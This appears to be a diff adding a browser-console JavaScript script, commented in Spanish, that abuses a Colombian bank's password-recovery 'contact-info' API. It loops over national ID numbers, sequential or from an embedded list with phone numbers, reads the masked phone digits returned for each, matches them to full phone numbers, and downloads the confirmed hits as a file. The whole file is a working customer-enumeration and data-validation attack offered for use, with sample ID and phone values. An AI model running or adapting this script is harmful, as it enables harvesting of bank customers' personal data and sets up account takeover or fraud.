@@ -1,0 +1,157 @@
+
+
+
+
+//add "CC,CE,PASSP" ; "Phone Number" on console 
+var dbText = `21324259;3112951399
+19896429;3112951399
+
+`;
+
+
+async function sleep(...a){ return new Promise(r => setTimeout(r, a[0] || 0x3e8 / 0x3c)); };
+async function send(cedula, phone = null){
+	await sleep(7000); //tiempo en ejecucion de la funcion
+	return await fetch("https://www.banco.colpatria.com.co/banca-virtual/api/customer/contact-info", {
+	  "headers": {
+		"content-type": "application/json"
+	  },
+	  "referrer": "https://www.banco.colpatria.com.co/banca-virtual/login/olvido-contrasena/datos-basicos",
+	  "referrerPolicy": "no-referrer-when-downgrade",
+	  "body": "{\"documentType\":\"C\",\"documentNumber\":\""+cedula+"\"}",
+	  "method": "POST",
+	  "mode": "cors",
+	  "credentials": "omit"
+	}).then(async r => {
+		var text = await r.text();
+		var ok = 'Error';
+		var lastNumber = null;
+		var fullNumber = "No Coincide";
+		try{
+			if((/"code":"SCS\-[\d]+"/i).test(text)){
+				ok = "OK";
+				if(phone != null){
+					try{
+						lastNumber = text.match(/"phone":"\*\*\* \*\*\*([\d]+)"/i)[1];
+						//console.log('lastNumber:', lastNumber);
+						//console.log(new RegExp(cedula+";([\\d]+"+lastNumber+");", "i"));
+						try{
+							fullNumber = phone.match(new RegExp("([\\d]+"+lastNumber+")", "i"))[1];
+							//console.log('fullNumber:', fullNumber);
+						}catch(ex){}
+					}catch(ex){}
+				}else{
+					try{
+						lastNumber = text.match(/"phone":"\*\*\* \*\*\*([\d]+)"/i)[1];
+						//console.log('lastNumber:', lastNumber);
+						//console.log(new RegExp(cedula+";([\\d]+"+lastNumber+");", "i"));
+						try{
+							fullNumber = dbText.match(new RegExp(cedula+";([\\d]+"+lastNumber+");", "i"))[1];
+							//console.log('fullNumber:', fullNumber);
+						}catch(ex){}
+					}catch(ex){}
+				}
+			}else
+			if((/"code":"ERR\-02"/i).test(text)){
+				ok = "No Tenemos tus datos";
+			}else
+			if(!(/"code":"ERR\-[\d]+"/i).test(text)){
+				//console.log(text);
+				ok = 'Extraño'; //copiar todos los registros pero que diga si esta registrado , habilitado o no se puedes
+				//*** ***1981
+			}
+		}catch(ex){}
+		
+		if(ok == 'OK'){
+			console.log('%c'+ok+' '+cedula+' Tel: '+fullNumber, 'color:green;font-size:24px;');
+			buenos.push(cedula+" "+fullNumber);
+		}else
+		if(ok == 'No Tenemos tus datos'){
+			console.log('%c'+ok+' '+cedula+' ', 'color:pink;font-size:24px;');
+			buenos.push(cedula+' '+ok);
+		}else
+		if(ok == 'Extraño'){
+			console.log('%c'+'Extraño: '+ok+" "+cedula, 'color:orange;font-size:24px;');
+			detener = true;
+		}else{
+			console.log('%c'+ok+" "+cedula, 'color:red;font-size:24px;');
+		}
+		
+	});
+}
+
+var buenos = [];
+
+(async()=>{
+	var length = 8;     // cantidad de digitos
+	var fixed = "5187"; //  valor estatico  51874431
+	var start = 4425;//16760018 , ++1
+	var end   = 4435;
+
+	var general = false; // para usar los de la lista uso general = false , para usar la secuencia ++1
+	
+	if(general){
+		var detener = false;
+		for(var index = start; index <= end; index++){
+			if(detener){
+				break;
+			}
+			var leftpad = '0'.repeat(length - fixed.toString().length - index.toString().length);
+			var cedula = fixed + leftpad + index;
+			//console.log('cedula:',cedula);
+			await send(cedula);
+		};
+	}else{
+		var list = [].slice.call(dbText.split(/\r\n|\n/gi)).filter(e => e != null && e != '');
+		while(list.length){
+			var e = list.shift();
+			try{
+				var cedula = e.split(";").filter(e => e != null && e != '')[0];
+				var phone = e.split(";").filter(e => e != null && e != '')[1];
+				
+				
+				await send(cedula, phone);
+				
+				
+			}catch(ex){}
+		}
+	}
+	
+	console.log('buenos:',buenos);
+	var name = "buenos.txt";
+	var blob = new Blob([buenos.join('\r\n')], {type:"octet/stream", lastModifiedDate: new Date(), name: name});
+	var link = document.createElement('a');
+		link.id = 'tempLink';
+		link.download = name;
+		link.href = URL.createObjectURL(blob);
+		link.target = '_blank';
+		document.body.appendChild(link);
+		tempLink.click();
+		document.body.removeChild(tempLink);
+})();
+
+
+
+
+
+
+/*
+["52372277", "12345678"].map( async cedula => {
+	await fetch("https://www.banco.colpatria.com.co/banca-virtual/api/customer/contact-info", {
+	  "headers": {
+		"content-type": "application/json"
+	  },
+	  "referrer": "https://www.banco.colpatria.com.co/banca-virtual/login/olvido-contrasena/datos-basicos",
+	  "referrerPolicy": "no-referrer-when-downgrade",
+	  "body": "{\"documentType\":\"C\",\"documentNumber\":\""+cedula+"\"}",
+	  "method": "POST",
+	  "mode": "cors",
+	  "credentials": "omit"
+	}).then(async r => {
+		console.log(r);
+		console.log(await r.text());
+	});
+});
+*/
+
+/*version 72 de crhome*/
